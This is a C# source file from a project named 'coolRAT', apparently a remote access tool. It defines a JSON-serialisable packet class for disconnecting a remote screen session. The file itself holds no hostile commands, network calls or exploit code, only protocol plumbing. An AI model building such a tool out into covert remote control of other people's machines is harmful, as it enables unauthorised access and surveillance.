using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class DisconnectScreenPacket : Packet
    {
        public Guid UniqueScreenId;
        public DisconnectScreenPacket(Guid uniqueClientId, Guid uniqueScreenId) : base(uniqueClientId)
        {
            UniqueScreenId = uniqueScreenId;
            Type = "DisconnectScreenPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static DisconnectScreenPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<DisconnectScreenPacket>(packet_string);
        }
    }
}
